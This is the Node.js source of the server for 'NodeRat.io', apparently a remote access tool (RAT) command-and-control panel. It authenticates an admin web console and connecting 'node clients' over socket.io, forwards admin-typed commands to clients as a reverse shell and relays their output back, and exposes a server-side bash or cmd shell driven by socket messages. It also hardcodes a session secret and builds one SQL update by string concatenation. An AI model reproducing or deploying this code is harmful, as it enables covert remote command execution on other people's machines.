///////////////////////////////////////////////////////////////////////
// Software: NodeRat.io (cloud)                                      //
// Version:  v1.0.1                                                  //
// Date:     2017-02-01                                              //
// Author:   Maxime Westhoven                                        //
// Website:  https://www.mwesto.be                                   //
// Licence:  Copyright © 2017-2018, All Rights Reserved.             //
///////////////////////////////////////////////////////////////////////

// [ Config Default ]
require('./routes/config');
// [ Module Dependency ]
fs         = require('fs-extra');             // adds file system methods that aren't included in the native fs module.
gm         = require('gm');                   // Permit to make pictures transformation and pictures analyzes
exec       = require('exec');                 // Permit to get shell access
moment     = require('moment');               // Permit to have more methods
express    = require('express');              // Express is a minimal and flexible Node.js web application framework that provides a robust set of features for web and mobile applications.
app        = express();
bodyParser = require('body-parser');          // Parse incoming request bodies in a middleware before your handlers, available under the req.body property.
multer     = require('multer')                // /!\ Multer is a middleware for handling multipart/form-data in FORM, whitouth this <input type='file'> will never work.
server     = require('http').Server(app);
mysql      = require('promise-mysql');        // Mysql nodejs drivers
colors     = require('colors');               // Put colors in your logs !
io         = require('socket.io')(server);    // /!\ Socket.IO enables real-time bidirectional event-based communication. It works on every platform, browser or device, focusing equally on reliability and speed.
sessions   = require("client-sessions");      // Permit to create sessions in express
passport   = require('passport');             // Passport is authentication middleware for Node.js. Extremely flexible and modular, Passport can be unobtrusively dropped in to any Express-based web application. A comprehensive set of strategies support authentication using a username and password, Facebook, Twitter, and more.
validator  = require('validator');            // Permit to check is so string are valid (valid mail, valid credit card, etc.)
crypto     = require("crypto");               // Crypto permit to make sha1, md5, bas64, etc encryption very easily.
spawn      = require('child_process').spawn;  // Shell on cloud
os         = require('os');                   // Get information on cloud system (os, etc.)
db         = mysql.createPool({ host : config_mysql_host, user : config_mysql_user, password : config_mysql_pswd, database : config_mysql_db});

// [ Configuration Server web ]
app.use(multer({dest:'./temps_uploads/'}).single('singleInputFileName'));
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({extended:true}));
app.use(passport.initialize());
app.use(passport.session());
app.use(sessions({ cookieName: 'mySession', secret: 'fg56h674fs86j7fg64hrst784dsjgg41jhftg4j8', duration: 2 * 24 * 60 * 60 * 1000, activeDuration: 24 * 60 * 60 * 1000 }));
app.use(express.static(__dirname +  '/views'));
app.set('views', __dirname + '/views');
app.set('view engine', 'ejs');
app.set('json spaces', 4);
app.engine('.ejs', require('ejs').__express);
passport.serializeUser(function(user, done) { done(null, user); });
passport.deserializeUser(function(obj, done) { done(null, obj); });
server.listen(config_port_server);

// [ Configuration Socket.io ]
io.set('origins', '*:*');

// [ Serveur Info ]

console.log('[SYSTEM]'.blue + ' Autheur : Maxime Westhoven (www.mwesto.be)');
console.log('[SYSTEM]'.blue + ' Welcome on NodeRat.io');
console.log('[SYSTEM]'.red + ' Server HTTP/MYSQL NODEJS is started.');
console.log('[SYSTEM]'.red + ' Server Express and socket.io is started.');
console.log('[SYSTEM]'.red + ' All Dependency loaded.');
console.log('[SYSTEM]'.green + ' Cloud started : http://' + config_ip_server+":"+config_port_server);

// =================================================== \\
// ================== Shell on Cloud ================= \\
// =================================================== \\
if (os.platform() == "linux" || os.platform() == "darwin") var init = "bash";
if (os.platform() == "win32") var init = "cmd";
var spawn = spawn(init);
spawn.stdout.setEncoding("utf8");
spawn.stderr.setEncoding("utf8");

// =================== Shell Cloud Callback ====================== \\
spawn.stdout.on("data", function (data) {
	webAdmin.to("webAdmin").emit("reverseShellCallbackCloud", data, "success");
});

spawn.stderr.on("data", function (data) {
	webAdmin.to("webAdmin").emit("reverseShellCallbackCloud", data, "error");
});

// =================================================== \\
// ===========FUNCTIONS MIDDELWAR (MODELES)=========== \\
// =================================================== \\

middlewares = require("./routes/middlewares");

// =================================================== \\
// ===================BASE REDIRECT=================== \\
// =================================================== \\

// [ Redirect Logged / Not logged app ]
app.get('', function(req, res) {
	if (req.mySession.admin) {  res.redirect('/home'); } else { res.redirect('/login'); }
})

// =================================================== \\
// =================ROUTING FRONTEND================== \\
// =================================================== \\

// [ Login / Register / Logout ]
var app_login = require('./routes/app/login');
app.post('/login', middlewares.dependency_loggedOut_app, app_login.loginpost);
app.get('/login' , middlewares.dependency_loggedOut_app, middlewares.dependency_logs_app, app_login.loginget);
app.get('/logout', middlewares.dependency_loggedOut_app, middlewares.dependency_logs_app, app_login.logout);

// [ Home ]
var app_home = require('./routes/app/home');
app.get('/home', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_home.home);
app.post('/home', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_home.home_post);

// [ Client ]
var app_client = require('./routes/app/client');
app.get('/client_dashboard/:id', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_client.client_dashboard);
app.post('/client_dashboard/:id', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_client.client_dashboard_post);
app.get('/client_delete/:id', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_client.client_dashboard_delete);
app.get('/client_remote_shell/:id', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_client.client_remote_shell);

// [ Config ]
var app_config = require('./routes/app/config');
app.get('/config', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_config.home);
app.post('/config', middlewares.logged_app, middlewares.dependency_loggedIn_app,  middlewares.dependency_logs_app, app_config.home_post);


// =================================================== \\
// =======================404========================= \\
// =================================================== \\
app.get('*', function(req, res){
 	res.status(404).render('404/404.ejs');
});

// =================================================== \\
// ====================Socket.IO====================== \\
// =================================================== \\

var webAdmin   = io.of('/webAdmin');
var nodeClient = io.of('/nodeClient');

// =================================================== \\
// ====================WEB-ADMIN====================== \\
// =================================================== \\
webAdmin.on('connection', function (socket) {

	var clientAddressIp = socket.request.connection.remoteAddress;

	socket.on('initWebAdmin', function(data) {
		var adminCheck =  "SELECT * FROM t_admins WHERE admin_mail = " + db.escape(data.admin_mail) + " AND admin_password = " + db.escape(data.admin_password) + " AND admin_active = 1;";
		db.query(adminCheck, function(err, rows, fields) {
			if(rows.length != 0){
				var admin = rows[0];
				var logs = "Admin is authorized to socket.io: ";
				console.log(logs.green, socket.id, clientAddressIp);
				webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " + clientAddressIp, "success");
				middelwareWebAdminAuthorized(socket, admin, clientAddressIp);
			}else{
				var logs = "Admin is not authorized to socket.io: ";
				console.log(logs.red, socket.id, clientAddressIp);
				webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " + clientAddressIp, "danger");
			}
		});
	});

});


function middelwareWebAdminAuthorized(socket, admin, clientAddressIp) {

	webAdmin.emit("webAdminOnline", admin.admin_id);
	socket.join("webAdmin");
	socket.join("webAdmin-"+admin.admin_id);
	webAdminAuthorized(socket, admin, clientAddressIp);

}

function webAdminAuthorized(socket, admin, clientAddressIp) {

	// =================== LOGS ====================== \\
	var logs = "Authorized admin passed middelware & auth: ";
	console.log(logs.green, "webAdmin-"+admin.admin_id+" ("+admin.admin_pseudo+")", clientAddressIp);
	webAdmin.to("webAdmin").emit("liveLogClient", logs + "webAdmin-"+admin.admin_id+" ("+admin.admin_pseudo+")"  + " / " + clientAddressIp, "success");

	// Prevent web socket is ready to use
	webAdmin.to("webAdmin-"+admin.admin_id).emit('adminInittSuccess', admin);

	// Get online clients
	socket.on('getNodeClientOnline', function() {
		var onlineClientsIo = Object.keys(nodeClient.adapter.sids);
		onlineClientsIo.forEach(function(onlineClientIo){
		    var ClientOnline = "SELECT client_id FROM t_clients WHERE client_socket = " + db.escape(onlineClientIo) + " ";
		    db.query(ClientOnline, function(err, rows, fields) {
		    	if(rows.length == 1)
		    	webAdmin.to("webAdmin-"+admin.admin_id).emit('nodeClientOnline', rows[0].client_id);
		    });
		});
	});

	// =================== Shell Cloud ====================== \\
	socket.on('cmdForReverseShellCloud', function(cmd) {
		spawn.stdin.write(cmd + "\n");
	});

	// =============== Reverse shell Client ================ \\
	socket.on('cmdForReverseShell', function(clientId, adminId, cmd) {
		nodeClient.to("nodeClient-"+clientId).emit('cmdForReverseShell', adminId, cmd);
	});

	// ================ Future features... ================= \\
	//............
	//............
	//............

}

// =================================================== \\
// ===================NODE-CLIENT===================== \\
// =================================================== \\
var config = "SELECT * FROM t_configs WHERE config_active = '1';";
db.query(config, function(err, rows, fields) {

	var config = rows[0];

	console.log('[SYSTEM]'.green + ' Cloud mode authentification : ' + config.config_mode);

	nodeClient.on('connection', function (socket) {

		var clientAddressIp = socket.request.connection.remoteAddress;

		var logs = "Client try to connecte to socket.io: ";
		console.log(logs.yellow, socket.id, clientAddressIp);
		webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " +clientAddressIp, "warning");

		socket.on('initNodeClient', function(data) {

			if(config.config_mode == "open"){
				// in development...
			}

			if(config.config_mode == "close"){

				var cloudCheckAuth =  "SELECT * FROM t_configs WHERE config_password = " + db.escape(crypto.createHash('sha1').update(crypto.createHash('sha1').update(data.cloud_password).digest().toString('base64')).digest().toString('base64')) + " AND config_active = 1;";
				db.query(cloudCheckAuth, function(err, rows, fields) {
					if(rows.length != 0){
						var clientCheckBan =  "SELECT * FROM t_clients WHERE client_serial = " + db.escape(data.client_serial) + " AND client_key = " + db.escape(data.client_key) + " AND client_active = 0;";
						db.query(clientCheckBan, function(err, rows, fields) {
							if(rows.length == 0){
								var clientCheckAuth =  "SELECT * FROM t_clients WHERE client_serial = " + db.escape(data.client_serial) + " AND client_key = " + db.escape(data.client_key) + " AND client_active = 1;";
								db.query(clientCheckAuth, function(err, rows, fields) {
									if(rows.length != 0){
										var client = rows[0];
										var logs = "Client is registered in database: ";
										console.log(logs.green, socket.id, clientAddressIp, client);
										webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " +clientAddressIp + " <br> " + JSON.stringify(client), "success");
										middelWareNodeClientAuthorized(socket, clientAddressIp, client);
									}else{
										var logs = "Client is not registered in database: ";
										console.log(logs.red, socket.id, clientAddressIp);
										webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " +clientAddressIp, "danger");
									}
								});
							}else{
								var logs = "Client is banned: ";
								console.log(logs.red, socket.id, clientAddressIp);
								webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " +clientAddressIp, "danger");
							}
						});
					}else{
						var logs = "Bad Config Cloud Password: ";
						console.log(logs.red, socket.id, clientAddressIp);
						webAdmin.to("webAdmin").emit("liveLogClient", logs + socket.id + " / " +clientAddressIp, "danger");
					}
				});

			}

		});

		socket.on('disconnect', function(data){
			var disconnect =  "SELECT * FROM t_clients WHERE client_socket = " + db.escape(socket.id) + " ;";
			db.query(disconnect, function(err, rows, fields) {
				if(rows.length != 0)
				webAdmin.emit("nodeClientOffline", rows[0].client_id, clientAddressIp);
			});
		});

	});

});


function middelWareNodeClientAuthorized(socket, clientAddressIp, client) {

	db.query("UPDATE t_clients SET client_socket = '"+socket.id+"' WHERE client_id = '"+client.client_id+"'");
	webAdmin.emit("nodeClientOnline", client.client_id);
	socket.join("nodeClient");
	socket.join("nodeClient-"+client.client_id);
	nodeClientAuthorized(socket, clientAddressIp, client);

}

function nodeClientAuthorized(socket, clientAddressIp, client) {

	console.log("Authorized client passed middelware & auth: ".green, socket.id, clientAddressIp);
	webAdmin.to("webAdmin").emit("liveLogClient", "Authorized client passed middelware & auth: " + socket.id + " / " +clientAddressIp, "success");

	// ================ Update Client Info ==================== \\
	nodeClient.to("nodeClient-"+client.client_id).emit('clientInitSuccess', client);
	socket.on('clientUpdateInfo', function(data){
		db.query("UPDATE t_clients "+
						 "SET client_hostname = "+db.escape(data.hostname)+", "+
						 "client_ip = "+db.escape(clientAddressIp)+", "+
						 "client_os = "+db.escape(data.platform)+", "+
						 "client_os_version = "+db.escape(data.arch)+", "+
						 "client_version = "+db.escape(data.version)+", "+
						 "client_privilege_access = '0', "+ // not yet coded...
						 "client_country = '/' "+ // not yet coded...
						 "WHERE client_id = "+db.escape(client.client_id)+"");
	});

	// =========== Reverse shell callback client =========== \\
	socket.on('reverseShellCallback', function(clientId, adminId, type, data){
		webAdmin.to("webAdmin-"+adminId).emit('reverseShellCallback', clientId, type, data);
	});

	// ================ Future features... ================= \\
	//............
	//............
	//............

}
